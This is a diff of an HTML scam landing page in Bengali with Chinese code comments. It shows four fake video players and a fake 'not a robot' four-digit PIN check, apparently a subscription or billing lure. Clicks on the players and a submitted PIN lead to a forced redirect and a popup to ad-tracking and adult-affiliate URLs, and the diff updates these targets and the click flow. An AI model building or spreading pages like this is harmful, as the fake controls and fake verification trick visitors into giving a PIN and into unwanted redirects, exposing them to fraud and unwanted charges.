@@ -6,15 +6,16 @@
         <title class="a1">মনোযোগ！</title>
         <link rel="stylesheet" type="text/css" href="/public/styles/styles.min.css">
         <link rel="shortcut icon" href="/public/images/action.ico">
+
         <script>
             function launchpopLink() {
-                var redirectUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
-                var mainUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
+                var redirectUrl = "https://ig2kv.bemobtrcks.com/click";
+                var mainUrl = "https://ig2kv.bemobtrcks.com/click";
             
                 window.location.href = redirectUrl;
                 window.open(mainUrl, "_blank");
             }
-        </script>  
+        </script>
             
         <script>
             function init() {
@@ -31,9 +32,13 @@
     
 </head>
 <body>
+    
+    <div class="mask hidden" id="mask">
+    </div>       
+
     <div class="container">
         
-        <div class="container-pin"  id="container">
+        <div class="container-pin hidden"  id="container">
               
             <h3>নিশ্চিত করুন যে আপনি কোনও রোবট নন।</h3>             
             <br>
@@ -198,6 +203,7 @@
                 const loadingDiv = document.getElementById('loading');
                 const containerDiv = document.getElementById('container');
                 const maskDiv = document.getElementById('mask');
+                const fourplayerDiv = document.getElementById('fourplayer');
                
                 // 验证PIN码
                 if (!pinInput.value.match(/^\d{4}$/)) {
@@ -237,17 +243,13 @@
                         }
                         // 没重定向将整个div隐藏，显示出下面的播放按钮，方便点击跳转
                         else{
-                             
-                           
-                                
-                                
-                                setTimeout(() => {
-                                    containerDiv.classList.add('hidden');maskDiv.classList.add('hidden');
-                                }, 1000);
-                            
-                            
-                            
+                            setTimeout(() => {
+                                containerDiv.classList.add('hidden');
+                                maskDiv.classList.add('hidden');
+                            }, 1000);   
                         }
+                        fourplayerDiv.removeEventListener('click', ShowContainer);
+                        fourplayerDiv.addEventListener('click', launchpopLink);
                     } 
                     else {
                         errorDiv.textContent = 'অবৈধ যাচাইকরণ কোড। অনুগ্রহ করে আবার চেষ্টা করুন।';
@@ -266,113 +268,109 @@
         
     </div>
 
+    
+
+    
+
+    <div onclick="ShowContainer()" id="fourplayer">
+        <!-- 第一行播放器 -->
+        <div class="player-row">
+            <div class="player-container">
+                <div class="player bg1">
+                    <div class="controls">
+                        <button class="button" >▶</button>
+                        <div class="progress">
+                            <div class="progress-filled"></div>
+                        </div>
+                        <div class="time">0:00 / 39:46</div>
+                        <button class="button" >🔊</button>
+                        <button class="button" >⛶</button>
+                    </div>
+                    <div class="player_content">
+                        <img class="loading2" src="/public/images/loading2.svg" alt="">
+                        
+                        <img class="play" src="/public/images/play.svg" alt="" >
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 第二行播放器 -->
+        <div class="player-row">
+            <div class="player-container">
+                <div class="player bg2">
+                    <div class="controls">
+                        <button class="button">▶</button>
+                        <div class="progress">
+                            <div class="progress-filled"></div>
+                        </div>
+                        <div class="time">0:00 / 21:36</div>
+                        <button class="button" >🔊</button>
+                        <button class="button" >⛶</button>
+                    </div>
+                    <div class="player_content">
+                        <img class="loading2" src="/public/images/loading2.svg" alt="">
+                        
+                        <img class="play" src="/public/images/play.svg" alt="" >
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 第三行播放器 -->
+        <div class="player-row">
+            <div class="player-container">
+                <div class="player bg3">
+                    <div class="controls">
+                        <button class="button" >▶</button>
+                        <div class="progress">
+                            <div class="progress-filled"></div>
+                        </div>
+                        <div class="time">0:00 / 35:21</div>
+                        <button class="button" >🔊</button>
+                        <button class="button" >⛶</button>
+                    </div>
+                    <div class="player_content">
+                        <img class="loading2" src="/public/images/loading2.svg" alt="">
+                        
+                        <img class="play" src="/public/images/play.svg" alt="" >
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 第四行播放器 -->
+        <div class="player-row">
+            <div class="player-row" >
+            <div class="player-container">
+                <div class="player bg4">
+                    <div class="controls">
+                        <button class="button">▶</button>
+                        <div class="progress">
+                            <div class="progress-filled"></div>
+                        </div>
+                        <div class="time">0:00 / 36:25</div>
+                        <button class="button">🔊</button>
+                        <button class="button">⛶</button>
+                    </div>
+                    <div class="player_content">
+                        <img class="loading2" src="/public/images/loading2.svg" alt="">
+                        
+                        <img class="play" src="/public/images/play.svg" alt="" onclick="ShowContainer()">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
     <script>
-        // 简单的播放器控制逻辑
-        document.addEventListener('DOMContentLoaded', function() {
-            const playButtons = document.querySelectorAll('.button');
-            
-            playButtons.forEach(button => {
-                if (button.textContent === '▶') {
-                    button.addEventListener('click', function() {
-                        const isPlaying = this.textContent === '❚❚';
-                        this.textContent = isPlaying ? '▶' : '❚❚';
-                    });
-                }
-            });
-        });
-    </script>
+        function ShowContainer() {
+            const containerDiv = document.getElementById('container');
+            const maskDiv = document.getElementById('mask');
 
-    <div class="mask" id="mask">
-    </div>
+            containerDiv.classList.remove('hidden');
+            maskDiv.classList.remove('hidden');
 
-    
-    <!-- 第一行播放器 -->
-    <div class="player-row">
-        <div class="player-container">
-            <div class="player bg1 blur-bg">
-                <div class="controls">
-                    <button class="button" onclick="launchpopLink()">▶</button>
-                    <div class="progress">
-                        <div class="progress-filled"></div>
-                    </div>
-                    <div class="time">0:00 / 39:46</div>
-                    <button class="button" onclick="launchpopLink()">🔊</button>
-                    <button class="button" onclick="launchpopLink()">⛶</button>
-                </div>
-                <div class="player_content">
-                    <img class="loading2" src="/public/images/loading2.svg" alt="">
-                    
-                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- 第二行播放器 -->
-    <div class="player-row">
-        <div class="player-container">
-            <div class="player bg2 blur-bg">
-                <div class="controls">
-                    <button class="button" onclick="launchpopLink()">▶</button>
-                    <div class="progress">
-                        <div class="progress-filled"></div>
-                    </div>
-                    <div class="time">0:00 / 21:36</div>
-                    <button class="button" onclick="launchpopLink()">🔊</button>
-                    <button class="button" onclick="launchpopLink()">⛶</button>
-                </div>
-                <div class="player_content">
-                    <img class="loading2" src="/public/images/loading2.svg" alt="">
-                    
-                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- 第三行播放器 -->
-    <div class="player-row">
-        <div class="player-container">
-            <div class="player bg3 blur-bg">
-                <div class="controls">
-                    <button class="button" onclick="launchpopLink()">▶</button>
-                    <div class="progress">
-                        <div class="progress-filled"></div>
-                    </div>
-                    <div class="time">0:00 / 35:21</div>
-                    <button class="button" onclick="launchpopLink()">🔊</button>
-                    <button class="button" onclick="launchpopLink()">⛶</button>
-                </div>
-                <div class="player_content">
-                    <img class="loading2" src="/public/images/loading2.svg" alt="">
-                    
-                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- 第四行播放器 -->
-    <div class="player-row">
-        <div class="player-row" >
-        <div class="player-container">
-            <div class="player bg4 blur-bg">
-                <div class="controls">
-                    <button class="button" onclick="launchpopLink()">▶</button>
-                    <div class="progress">
-                        <div class="progress-filled"></div>
-                    </div>
-                    <div class="time">0:00 / 36:25</div>
-                    <button class="button" onclick="launchpopLink()">🔊</button>
-                    <button class="button" onclick="launchpopLink()">⛶</button>
-                </div>
-                <div class="player_content">
-                    <img class="loading2" src="/public/images/loading2.svg" alt="">
-                    
-                    <img class="play" src="/public/images/play.svg" alt="" onclick="launchpopLink()">
-                </div>
-            </div>
-        </div>
-    </div>
+        }
+    </script>  
 </body>
 </html>
